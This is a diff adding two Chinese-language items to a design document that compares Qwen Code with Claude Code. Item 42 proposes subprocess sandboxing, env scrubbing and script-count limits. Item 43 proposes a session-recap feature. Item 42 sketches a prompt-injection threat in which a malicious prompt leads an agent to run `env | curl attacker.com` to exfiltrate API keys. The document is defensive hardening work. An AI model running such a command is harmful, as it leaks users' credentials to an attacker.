@@ -1357,3 +1357,83 @@ Agent 读取了项目中的 `.env` 文件，文件内容包含 AWS 密钥和 Str
 **意义**：多 Agent 场景下的身份连续性——Agent 不知道自己是谁就无法正确协作。
 **缺失后果**：Teammate "Alice" 压缩后变成通用 Agent → 不知道该向谁汇报 → 协作中断。
 **改进收益**：身份重注入 = 压缩后 Agent 仍然知道自己的角色和团队。
+
+---
+
+<a id="item-42"></a>
+
+### 42. 子进程 PID 命名空间沙箱 + 脚本次数限制（P2）
+
+**来源**：Claude Code v2.1.98 新增 `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` + `CLAUDE_CODE_SCRIPT_CAPS`。
+
+**问题**：Qwen Code 的 Shell 工具执行子进程时**不隔离**——子进程能看到父进程的所有环境变量（可能含有 API Key、认证信息）、可无限次启动脚本（可被恶意 hook 滥用）、在 Linux 上缺少 PID 命名空间隔离。
+
+**Claude Code v2.1.98 的方案**：
+
+1. **PID 命名空间隔离（Linux）**：当 `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` 被设置时，子进程在**独立 PID 命名空间**运行——看不到宿主机其他进程，`ps aux` 只显示自己。
+2. **环境变量清洗**：scrub 掉敏感变量（API key、OAuth token 等）后才传给子进程。
+3. **脚本调用次数限制**：`CLAUDE_CODE_SCRIPT_CAPS` 限制每个 session 能启动多少次脚本——防止恶意 prompt 导致无限 fork。
+
+源码索引（Claude Code）：
+- `utils/sandbox/` — PID 命名空间初始化
+- `utils/env.ts` — `scrubEnvForSubprocess()`
+- `utils/scriptCaps.ts` — per-session 计数
+
+**Qwen Code 现状**：
+- 已有 `sandbox.ts`（984 行，macOS Seatbelt + Docker/Podman），但 Linux 缺少命名空间隔离（只有容器化）
+- 没有子进程环境变量清洗
+- 没有脚本次数上限
+
+**Qwen Code 修改方向**：
+1. Linux 子进程用 `unshare(CLONE_NEWPID)` 或 `bwrap --unshare-pid` 启动
+2. `scrubEnvForSubprocess()`：白名单或黑名单过滤敏感环境变量
+3. `ScriptCapsService`：每 session 维护计数器，超过阈值拒绝新调用 + warning
+
+**实现成本评估**：
+- 涉及文件：~4 个
+- 新增代码：~300 行
+- 开发周期：~3 天
+- 难点：PID 命名空间在非 root 环境的权限处理、env scrub 的白名单合理性
+
+**意义**：Shell 工具是 agent 的主要攻击面——子进程能看到什么环境变量、能启动多少次进程都是关键安全边界。
+**缺失后果**：恶意 prompt 可以诱导 Agent 执行 `env | curl attacker.com` 外传 API Key；可以通过无限 fork 耗尽系统资源。
+**改进收益**：PID namespace + env scrub + script caps = shell 子进程只能看到必要信息，调用次数受限。
+
+---
+
+<a id="item-43"></a>
+
+### 43. 会话 Recap（返回时上下文摘要）（P2）
+
+**来源**：Claude Code v2.1.108 + v2.1.110。
+
+**问题**：用户离开几天再打开一个旧会话，往往需要滚动几页才能想起**"我上次在做什么"**。当前 Qwen Code `/resume` 仅重新加载消息，不主动给用户一个"回忆"。
+
+**Claude Code 的方案**（v2.1.108 `/recap` 命令 + v2.1.110 自动展示）：
+
+- 返回 session 时自动展示 recap（1-3 句话总结"高层任务 + 下一步"）
+- 手动触发 `/recap` 命令
+- 使用**轻量级 small-fast-model**（Haiku）总结最近 30 条消息
+- 集成 session memory（如果启用）获得更广的上下文
+- 遥测禁用的用户也默认启用（用 `CLAUDE_CODE_ENABLE_AWAY_SUMMARY=0` 禁用）
+
+源码（Claude Code）：
+- `services/awaySummary.ts` — `buildAwaySummaryPrompt()`、`RECENT_MESSAGE_WINDOW = 30`
+
+**Qwen Code 现状**：`/resume` 仅加载消息，无 recap 机制。PROJECT_SUMMARY.md 提供了类似能力但是人工维护。
+
+**Qwen Code 修改方向**：
+1. 新建 `services/sessionRecap.ts`：输入最近 N 条消息 + 可选 memory block，调用 fastModel（[PR#3120 已合并](https://github.com/QwenLM/qwen-code/pull/3120) 已有 fastModel 选择器）生成 1-3 句摘要
+2. `/resume` 切换会话后自动显示 recap（默认开启，可配置 `showSessionRecap: false`）
+3. 新建 `/recap` 命令手动触发
+4. Recap prompt 模板：高层任务 → 下一步，不做状态汇报和 commit 摘要
+
+**实现成本评估**：
+- 涉及文件：~3 个
+- 新增代码：~150 行
+- 开发周期：~2 天
+- 前置：[PR#3120](https://github.com/QwenLM/qwen-code/pull/3120) fastModel 配置（已合并）
+
+**意义**：返回旧会话的体验直接影响**长项目的用户粘性**——想不起上次做什么就容易放弃。
+**缺失后果**：用户打开长会话 → 滚动几页回忆 → 体验差 → 倾向于开新会话丢弃旧上下文。
+**改进收益**：recap = 3 秒钟回忆上次做到哪里。
